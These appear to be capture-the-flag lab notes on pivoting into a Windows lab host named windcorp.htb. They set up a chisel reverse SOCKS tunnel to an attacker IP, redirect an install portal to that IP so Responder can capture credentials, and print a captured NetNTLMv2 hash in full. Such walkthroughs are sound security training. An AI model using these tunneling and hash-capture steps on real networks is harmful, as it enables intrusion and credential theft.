# Pivoting

```bash
ipconfig
arp -a

ARP cache
=========

    IP address    MAC address        Interface
    ----------    -----------        ---------
    172.21.192.1  00:15:5d:f2:77:5b  32
    224.0.0.22    01:00:5e:00:00:16  32
    224.0.0.22    00:00:00:00:00:00  31
    224.0.0.251   01:00:5e:00:00:fb  32
    224.0.0.252   01:00:5e:00:00:fc  32

```

# Using chisel as reverse proxy

## Starting the Server

```bash
./chisel server -reverse -socks5 -p 9000
2021/08/20 07:04:53 server: Reverse tunnelling enabled
2021/08/20 07:04:53 server: Fingerprint udt+pSAg+UU2XLxwxG5gc468UZ9Fd/mps54Y6zMpXdQ=
2021/08/20 07:04:53 server: Listening on http://0.0.0.0:9000
``` 

## Running the Client

```bash
.\chisel.exe client 10.10.14.11:9000 R:127.0.0.1:socks
```

## New page on Firefox

![[Pasted image 20210820112359.png]]

This website installs on a remote IP the software available. So we can change the IP and set a Responder to get the NTLM Hash

```bash
python Responder.py -I tun0 -wrf
```

```
http://softwareportal.windcorp.htb/install.asp?client=10.10.14.11&software=gimp-2.10.24-setup-3.exe
```

![[Pasted image 20210820122512.png]]


```bash
localadmin::windcorp:540261b9dcda63d3:A9C21826035C6381A72155A9200979C7:0101000000000000F65FA3E8B595D70122038369D15CA1040000000002000800460053004900460001001E00570049004E002D00440037005900460044005000570047004C00580038000400140046005300490046002E004C004F00430041004C0003003400570049004E002D00440037005900460044005000570047004C00580038002E0046005300490046002E004C004F00430041004C000500140046005300490046002E004C004F00430041004C00080030003000000000000000000000000021000066F49636E0D432242C05EA70530A20D4396CDD5D4D0ECD9F623B7ABBD4D567DF0A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00310031000000000000000000
``` 